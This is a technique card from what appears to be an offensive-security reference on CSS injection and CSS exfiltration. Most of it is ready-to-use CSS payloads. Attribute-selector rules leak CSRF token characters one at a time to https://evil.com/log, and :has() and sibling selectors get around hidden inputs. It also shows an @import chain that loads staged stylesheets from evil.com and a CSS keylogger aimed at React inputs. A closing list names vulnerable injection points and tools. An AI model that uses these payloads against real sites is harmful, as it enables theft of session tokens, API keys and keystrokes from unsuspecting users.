---
id: "css-injection"
title: "CSS Injection & CSS Exfiltration"
type: "technique"
category: "web-application"
subcategory: "client-side"
tags: ["css-injection", "css-exfiltration", "data-theft", "csrf-token", "csp-bypass", "keylogger"]
platforms: ["linux", "macos", "windows"]
related: ["xss", "encoding-bypass-reference"]
difficulty: "advanced"
updated: "2026-04-14"
---

# CSS Injection & CSS Exfiltration

## Why This Matters
When CSP blocks JavaScript but allows inline CSS, or when you can inject CSS but not JS, CSS attribute selectors can exfiltrate data character by character. Steals CSRF tokens, API keys, and even keystrokes.

## CSRF Token Exfiltration
```css
/* Brute-force first character of hidden input value */
input[name="csrf"][value^="a"] { background: url(https://evil.com/log?c=a); }
input[name="csrf"][value^="b"] { background: url(https://evil.com/log?c=b); }
input[name="csrf"][value^="c"] { background: url(https://evil.com/log?c=c); }
/* ... for all hex chars ... */

/* After first char found (e.g., "a"), brute-force second: */
input[name="csrf"][value^="a0"] { background: url(https://evil.com/log?c=a0); }
input[name="csrf"][value^="a1"] { background: url(https://evil.com/log?c=a1); }
```

## Hidden Input Bypass
```css
/* Hidden inputs don't render backgrounds. Use :has() or sibling: */
form:has(input[name="csrf"][value^="a"]) {
  background: url(https://evil.com/log?c=a);
}
/* Or sibling selector: */
input[name="csrf"][value^="a"] ~ * {
  background: url(https://evil.com/log?c=a);
}
```

## Sequential Import Chaining (Automated)
```css
/* Initial injection loads attacker stylesheet: */
@import url(https://evil.com/stage1.css);

/* Server dynamically generates next stage based on callbacks */
/* Each stage brute-forces one more character */
/* Full token exfiltrated in ~32 requests for 32-char token */
```

## CSS Keylogger (React/frameworks that reflect value in DOM)
```css
input[value$="a"] { background: url(https://evil.com/log?key=a); }
input[value$="b"] { background: url(https://evil.com/log?key=b); }
/* Fires when input value attribute changes (React controlled components) */
```

## Where to Find This
- Custom CSS/theme input fields
- HTML injection where `<style>` is allowed but `<script>` blocked by CSP
- Markdown renderers allowing CSS
- Apps with `style-src 'unsafe-inline'` CSP
- Reflected parameters in CSS contexts

## Tools
- CSSInjector, cssExfiltrate (automated exfiltration)
- Custom server to receive callbacks and generate next-stage CSS
